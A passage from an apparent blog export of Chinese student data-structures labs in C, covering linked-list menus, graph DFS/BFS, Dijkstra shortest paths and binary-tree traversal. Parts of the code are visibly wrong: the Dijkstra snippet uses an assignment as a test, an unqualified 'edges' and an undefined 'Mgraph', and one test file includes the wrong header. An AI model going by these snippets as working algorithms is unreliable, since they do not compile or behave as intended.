class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Creat_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//删除记录</span></span><br><span class="line">                    Dele_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//修改记录</span></span><br><span class="line">                    Update_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//查找记录</span></span><br><span class="line">                    Find_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//插入记录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择插入方式(1.前插法 2.尾插法)&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Insert_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Insert_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//遍历</span></span><br><span class="line">                    Printall_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//释放</span></span><br><span class="line">                    Destroy_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/15/KdJ6nYGcFESbrhP.png" alt="image-20211015165430030"></p>
<p><img src="https://i.loli.net/2021/10/15/plQ1m5XRcCDOtHJ.png" alt="image-20211015165636809"></p>
<p><img src="https://i.loli.net/2021/10/15/6lhzZMNEI3XYrP9.png" alt="image-20211015165510697"></p>
<p><img src="https://i.loli.net/2021/10/15/Ubm6uEakfOZnTV3.png" alt="image-20211015165608348"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>数据结构第三次实验-图的深度广度遍历</title>
    <url>/2021/11/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E5%9B%BE%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/13/oEKADMSHmjBbnxc.png" alt="image-20211113152053894"></p>
<blockquote>
<p><strong>加项内容：</strong></p>
<ol>
<li><strong>最短路径</strong></li>
<li><strong>关键路径</strong></li>
<li><strong>拓扑排序</strong></li>
</ol>
</blockquote>
<p><strong>图邻接表定义头文件 （<code>深度优先遍历、广度优先遍历算法</code>）：<code>graph.h</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20			<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表创建 图结构定义 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;	<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>	<span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;			<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span>	<span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span>	<span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;	<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;			</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>			<span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;			  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);		<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;n; k++)&#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);		<span class="comment">//输入无序对</span></span><br><span class="line">			s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">			s-&gt;adjvex = j;</span><br><span class="line">			s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">			g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line">			<span class="keyword">if</span>(c == <span class="number">0</span>)&#123;			<span class="comment">//无向图</span></span><br><span class="line">				s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">				s-&gt;adjvex = i;</span><br><span class="line">				s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">				g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>		<span class="comment">//文件打开失败</span></span><br><span class="line">		g-&gt;n = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">	<span class="comment">//测试</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	printf(&quot;%d,%d&quot;,g-&gt;n,g-&gt;e);</span></span><br><span class="line"><span class="comment">	printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">	for(i=0;i&lt;g-&gt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">		printf(&quot;%c&quot;,g-&gt;adjlist[i].vertex);</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问顶点：%c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;		<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;		<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            dfs(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])		<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            dfs(g,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">queue</span>[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>;		 <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">queue</span>[rear++] = i;		<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = <span class="built_in">queue</span>[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                <span class="built_in">queue</span>[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;	<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;		<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            bfs(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>test.cpp</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \t1.深度优先遍历          2.广度优先遍历       \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------0.退出----------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> select;</span><br><span class="line">    LinkedGraph g;</span><br><span class="line">    <span class="keyword">int</span> count,i;</span><br><span class="line">	create(&amp;g,<span class="string">&quot;g7.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		Menu();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">		<span class="keyword">switch</span>(select)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//深度优先遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;图的深度优先遍历序列为：\n&quot;</span>);</span><br><span class="line">				DfsTraverse(g);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:		<span class="comment">//广度优先遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;图的广度优先遍历序列为：\n&quot;</span>);</span><br><span class="line">				count = BfsTraverse(g);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;该图共有%d个连通分量\n&quot;</span>,count);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/13/Nq2oZ3BcWYHt1TV.png" alt="image-20211113155801024"></p>
<p><strong>测试：<code>test.cpp</code></strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;graph.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span>&#123;</span>FALSE,TRUE&#125; boolean;	<span class="comment">//false 0   true 1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> dist[M];		<span class="comment">//距离向量类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> path[M];		<span class="comment">//路径类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Dijkastra 算法求 单源最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkastra</span><span class="params">(Mgraph g,<span class="keyword">int</span> v0,path p,dist d)</span></span>&#123;</span><br><span class="line">    boolean <span class="keyword">final</span>[M]; <span class="comment">//标志 当前元素是否已经求出 最短路径</span></span><br><span class="line">    <span class="keyword">int</span> i,k,j,v,min,x;</span><br><span class="line">    <span class="comment">//初始化集合 S 与距离向量 d</span></span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>; v&lt;g.n; v++)&#123;</span><br><span class="line">        <span class="keyword">final</span>[v] = FALSE;</span><br><span class="line">        d[v] = g.edges[v0][v];</span><br><span class="line">        <span class="keyword">if</span>(d[v]&lt;FINITY &amp;&amp; d[v]=<span class="number">-1</span>)</span><br><span class="line">            p[v] = v0;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p[v] = <span class="number">-1</span>;  <span class="comment">//v 无前驱</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span>[v0] = TRUE;</span><br><span class="line">    d[v0] = <span class="number">0</span>;			<span class="comment">//初始时 s 只有 v0 一个结点</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//依次找出 n-1 个结点加入 S 中</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        min = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)  <span class="comment">//找最小边入结点</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; d[k] &lt; min)&#123;</span><br><span class="line">                v = k;</span><br><span class="line">                min = d[k];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%c----%d\n&quot;</span>,g.vexs[v],min);</span><br><span class="line">        <span class="keyword">if</span>(min == FINITY)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">final</span>[v] = TRUE;  <span class="comment">//v 加入 S</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修改 S 与 V-S 中各节点的距离</span></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; (min+g.edges[v][k] &lt; d[k]) )&#123;</span><br><span class="line">                d[k] = min + edges[v][k];</span><br><span class="line">                p[k] = v;</span><br><span class="line">            &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出 有向图 最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pritn_gpd</span><span class="params">(Mgraph g,path p,dist d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> st[M],i,pre,top=<span class="number">-1</span>;			<span class="comment">//定义栈 st 初始化空栈</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n距离：%7d,路径：&quot;</span>,d[i]);</span><br><span class="line">        st[++top] = i;</span><br><span class="line">        pre = p[i];</span><br><span class="line">        <span class="keyword">while</span>(pre != <span class="number">-1</span>)&#123;		<span class="comment">//从第 i 个顶点开始向前搜索最短路径上的顶点</span></span><br><span class="line">            st[++top] = pre;</span><br><span class="line">            pre = p[pre];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(top &gt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%2d&quot;</span>,st[top--]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>数据结构第二次实验-二叉树的遍历（递归、非递归）</title>
    <url>/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/11/P5kz2rRZslSJpCy.png" alt="image-20211111231233214"></p>
<p><strong>头文件 <code>bintree.h</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的存储：链式存储（不带双亲）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;					<span class="comment">//定义结点类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span> <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;  <span class="comment">//根结点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的创建：按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];		<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;			<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree t)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  		<span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------非递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;		<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 